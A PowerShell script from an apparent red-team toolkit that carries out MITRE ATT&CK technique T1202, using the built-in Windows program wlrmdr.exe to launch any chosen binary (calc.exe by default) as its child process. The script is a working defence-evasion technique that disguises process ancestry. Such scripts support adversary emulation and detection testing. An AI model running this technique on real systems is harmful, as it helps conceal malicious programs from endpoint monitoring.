<#
.SYNOPSIS
   MITRE ATT&CK T1202: Indirect Command Execution

   Author: @r00t-3xp10it
   Addapted from: @0gtweet
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: wlrmdr.exe {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   This cmdlet allow users to spawn processes
   with wlrmdr.exe as the parent process.

.NOTES
   Privileges required: UserLand
   Distros supported are: Windows 10, Windows 11

.Parameter Binary
   The process to spawn (default: calc.exe)

.Parameter Seconds
   The delay time for execution (default: 0)

.EXAMPLE
   PS C:\> .\Mitre-T1202.ps1 -Binary "mspaint.exe" -Seconds "1000"
   Spawn 'mspaint.exe' with 'wlrmdr.exe' as parent process.

.OUTPUTS
   * MITRE ATT&CK T1202: Indirect Command Execution.
   * Exec 'mspaint.exe' with wlrmdr.exe as parent process.

.LINK
   https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Binary="calc.exe",
   [int]$Seconds='0'
)


$CmdletVersion = "v1.0.1"
#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@T1202 $CmdletVersion {SSA@RedTeam}"
write-host "`n* MITRE ATT&CK T1202: Indirect Command Execution." -ForegroundColor Green
Start-Sleep -Seconds 1

If(-not(Test-Path -Path "$Env:WINDIR\System32\wlrmdr.exe"))
{
   Write-Host "x " -ForegroundColor Red -NoNewline
   Write-Host "Error: " -ForegroundColor DarkGray -NoNewline
   Write-Host "$($Error[0])" -ForegroundColor Red
   return
}

write-host "* Exec '" -ForegroundColor Green -NoNewline
write-host "$Binary" -ForegroundColor DarkYellow -NoNewline
write-host "' with wlrmdr as parent process." -ForegroundColor Green

Try{#Execute calc.exe with wlrmdr.exe as parent process
   wlrmdr.exe -s $Seconds -f 0 -t 0 -m 0 -a 11 -u "$Binary"
}Catch{
   Write-Host "x " -ForegroundColor Red -NoNewline
   Write-Host "Error: " -ForegroundColor DarkGray -NoNewline
   Write-Host "$($Error[0])" -ForegroundColor Red
   Return
}

